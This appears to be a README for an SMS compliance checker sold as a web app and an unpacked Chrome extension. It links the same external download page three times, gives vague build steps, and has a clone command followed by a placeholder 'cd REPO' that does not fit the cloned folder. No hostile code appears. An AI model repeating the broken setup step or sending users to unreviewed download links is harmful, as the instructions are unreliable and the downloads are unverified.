# 10DLC Check vLatest - SMS Compliance Tool 2026

> **10DLC Check is a browser-based tool and Chrome Extension that evaluates SMS messages for 10DLC and CTIA compliance considerations, offering live checks and AI-assisted message rewrites.**

[![Platform](https://img.shields.io/badge/Platform-Web%20and%20Chrome%20Extension-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/gabeexhill9128/10dlc-check-compliance-hub?style=flat-square)](https://github.com/gabeexhill9128/10dlc-check-compliance-hub)

---

<p align="center">
  <a href="https://gabeexhill9128.github.io/10dlc-check-compliance-hub/">
    <img src="https://img.shields.io/badge/Download-10DLC%20Check%20Latest-brightgreen?style=for-the-badge" alt="Download 10DLC Check">
  </a>
</p>

> **[Download 10DLC Check Latest](https://gabeexhill9128.github.io/10dlc-check-compliance-hub/)**

---

[Download Latest Build](https://gabeexhill9128.github.io/10dlc-check-compliance-hub/)

---

## Overview

10DLC Check gives teams a way to inspect SMS copy before it enters a supported messaging workflow. Its checks cover frequent compliance issues such as missing opt-out or HELP instructions, unclear sender identity, restricted information, and wording that could mislead recipients.

The project is suited to browser-based tools, including CRM platforms and SMS dashboards. Use the web application for a dedicated review experience, or use the Chrome Extension to bring scanning into compatible messaging workflows.

---

## What It Provides

- Run live checks against SMS compliance considerations.
- Produce AI-assisted alternatives for messages requiring changes.
- Verify the presence and handling of opt-out language and HELP keywords.
- Flag restricted or sensitive information found in message text.
- Examine sender identification and claims that may be misleading.
- Process content locally without logging message content.
- Continue using the core compliance rules during supported offline checks.
- Scan content inside CRM systems and SMS dashboards with Chrome integration.

---

## Getting Started

### Web application

Launch the hosted application from the current build:

[Open 10DLC Check](https://gabeexhill9128.github.io/10dlc-check-compliance-hub/)

### Chrome Extension setup

1. Download the project or clone its repository.
2. In Chrome, navigate to `chrome://extensions`.
3. Turn on **Developer mode**.
4. Click **Load unpacked**.
5. Select the folder that contains the extension files.
6. Visit a supported CRM or SMS dashboard and use the extension to inspect message content.

Clone the repository with:

```bash
git clone https://github.com/gabeexhill9128/10dlc-check-compliance-hub.git
cd REPO
```

Development and build instructions depend on the files supplied in the release you choose. If you are using a packaged release, load its included extension directory directly through Chrome.

---

## Using the Tool

1. Open the web application or start the Chrome Extension.
2. Paste an SMS message into 10DLC Check, or select message content from a supported dashboard.
3. Start the compliance scan.
4. Inspect the results for opt-out wording, HELP availability, sender identity, sensitive information, and misleading content.
5. Generate an AI-assisted rewrite if the message needs an alternative.
6. Scan the revised copy again before using it in an SMS workflow.

Supported offline checks continue to use the core compliance rules. AI-assisted rewriting can depend on the configured Cloudflare Workers AI service.

---

## Configuration Notes

The tool is built for Chrome-based, browser messaging workflows and the permissions required by the Chrome Extension. Keep configuration associated with the local extension or deployment files instead of adding it to message content.

Before running a local installation, inspect the project files for the available environment and deployment settings. Configure AI rewriting with the Cloudflare Workers AI values provided by the deployment. Sensitive message content and service credentials should not be placed in frontend files that are publicly accessible.

---

## Requirements

- A current web browser for using the web application.
- Google Chrome for Chrome Extension features.
- A supported CRM or SMS dashboard for embedded message scanning.
- A local repository copy for development or loading the extension unpacked.
- Internet connectivity for hosted functionality and AI-assisted rewriting when needed.
- Enough browser storage for the extension and its locally stored application data.

---

## Frequently Asked Questions

### Which SMS issues does 10DLC Check detect?

The scanner reviews SMS content for 10DLC and CTIA-related considerations. These include opt-out and HELP keyword handling, sender identification, sensitive data, and potentially misleading wording.

### Is message rewriting supported?

Yes. AI-powered compliant rewrites are available. Always inspect a suggested version yourself before sending or deploying it in a live messaging workflow.

### Is message content recorded?

The profile specifies local processing with zero content logging. Even so, review the behavior of the particular deployment before processing sensitive information.

### Can I run compliance checks offline?

The core rules support offline checks. Hosted capabilities and AI-powered rewriting can require an internet connection.

### How can I scan messages in a CRM?

Load the Chrome Extension, open a supported CRM or SMS dashboard, and use the scanner from the browser workflow in which the extension is available.

### What if the result does not look correct?

First verify that the complete message was submitted. Then examine each reported category separately, including opt-out wording, HELP handling, sender identification, and sensitive data. If the result remains unexpected, reproduce it with a minimal example and submit the relevant details through the project repository.

### Where do updates come from?

For the web version, use the latest build link. For the extension, download the newest files and reload the unpacked extension in Chrome.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
